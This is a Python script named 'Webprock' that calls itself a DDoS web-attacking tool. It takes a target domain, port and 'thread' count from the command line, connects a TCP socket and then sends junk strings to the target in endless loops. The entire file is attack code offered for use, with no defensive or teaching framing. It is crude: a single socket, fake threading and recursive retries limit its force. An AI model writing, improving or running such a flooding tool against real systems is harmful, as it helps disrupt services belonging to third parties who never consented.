import requests
import socket
import time

from datetime import datetime

import sys

SocketStream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class Webprock:
	def get_arguments():
		global Domain
		global Address
		global Port
		global Thread
		try:
			if sys.argv[1] == '-Domain':
				Domain = sys.argv[2]
				Domain = str(Domain)
				Address = socket.gethostbyname(Domain)
				if sys.argv[3] == '-Port':
					Port = sys.argv[4]
					Port = int(Port)
					if sys.argv[5] == '-Thread':
						Thread = sys.argv[6]
						Thread = int(Thread)
					else:
						sys.exit()
				else:
					sys.exit()
			else:
				sys.exit()
		except:
			print()
			print("Webprock - Helplist | 1 [-Domain <Target Domain>] | First  Argument |")
			print("                    | 2 [-Port  <Attacking Port>] | Second Argument |")
			print("                    | 3 [-Thread <Send Threader>] | third  Argument |")
			print()
			sys.exit()
	def stream_connection(Target, Port):
		global InputResult
		print()
		value = input("[+] Starting Webprock WebAttacking Program tool? [Y/n]: ")
		print()
		if value == 'Y':
			pass
		elif value == 'y':
			pass
		else:
			print()
			print("[!] Program exiting in 0.1 seconds")
			sys.exit()
		print("[+] Starting Webprock DDoS WebAttacking Program tool")
		time.sleep(2)
		print("[+] Launching and Execute functions in script")
		time.sleep(1)
		print("[+] Testing Connection to Target")
		def wait_connection():
			try:
				SocketStream.connect_ex((Target, Port))
				time.sleep(3)
				print("[+] Connection to Target Susses")
				print(f"[+] Target ipv4 address: {Target}")
				print(f"[+] Target Port: {Port}")
				print()
				InputResult = input(f"[+] Starting Procker to Target Domain: https://{Domain} [Y/n]: ")
				if InputResult == 'Y':
					print()
				elif InputResult == 'y':
					print()
				else:
					print()
					print("[!] Webprock Program exiting in 0.1 seconds")
					sys.exit()

			except Exception as ConnectionFailed:
				print("[+] Connection to Target Failed")
				sys.exit()
		wait_connection()
	def destroy_port():
		for procker in range(10):
			try:
				print("[+] [" + str(datetime.now()) + "] Procking to Target Domain. Recv Port and Domain data")
				SocketStream.send("Procking".encode())
				time.sleep(0.7)
			except:
				print("[!] Connection Failed Host destroy the Connection")
				sys.exit()
		time.sleep(2)
		print()
		print("[+] Procking to Target Domain Susses, want to Attack?")
		Value = input(f"[+] Want to start Webprock-attack to Domain: https://{Domain} [Y/n]: ")
		Other = input(f"[+] Want to see Webprock-attack Output? Domain: https://{Domain} [Y/n]: ")
		if Value == 'Y':
			pass
		elif Value == 'y':
			pass
		else:
			print("[+] Webprock Program exiting in 0.1 seconds")
			sys.exit()
		if Other == 'Y':
			Main = 0
			time.sleep(3)
			print(f"[+] Attacking Target Domain: https://{Domain} in 5 seconds")
			def Attack():
				while True:
					try:
						for attacking in range(Thread):
							localTime = datetime.now()
							print(f"[+] [" + str(localTime) +"] Procker: Sending Data Trash to Target Domain")
							SocketStream.send("9765456789087654w578".encode())
							SocketStream.sendall("zrizgzegiuzruizegier".encode())
					except Exception as ConnectionDumped:
						print(f"[+] Procker: Sending to Target Domain: https://{Domain} Failed")
						Attack()
			Attack()
		elif Other == 'y':
			Main = 0
			time.sleep(3)
			print(f"[+] Attacking Target Domain: https://{Domain} in 5 seconds")
			def Attack():
				while True:
					try:
						for attacking in range(Thread):
							localTime = datetime.now()
							print(f"[+] [" + str(localTime) +"] Procker: Sending Data Trash to Target Domain")
							SocketStream.send("9765456789087654w578".encode())
							SocketStream.sendall("zrizgzegiuzruizegier".encode())
					except Exception as ConnectionDumped:
						print(f"[+] Procker: Sending to Target Domain: https://{Domain} Failed")
						Attack()
			Attack()
		else:
			Main = 0
			time.sleep(3)
			print(f"[+] Attacking Target Domain: https://{Domain} in 5 seconds")
			print()
			print(f"[+] Attack to Target Domain: https://{Domain} started")
			print(f"    Destroy Port: {Port} Attacking with Webprock Procker")
			print(f"    Webprock Procker attacking Domain with attacks")
			print(f"    their offensive in cyber-security")
			def Attack():
				while True:
					try:
						for attacking in range(Thread):
							SocketStream.send("tzghujknjbgvzcfthkj".encode())
							SocketStream.sendall("tzghujknjbgvzc".encode())
					except Exception as ConnectionDumped:
						print(f"[+] Procker: Sending to Target Domain: https://{Domain} Failed")
						Attack()
			Attack()

Webprock.get_arguments()
Webprock.stream_connection(Address, Port)
Webprock.destroy_port()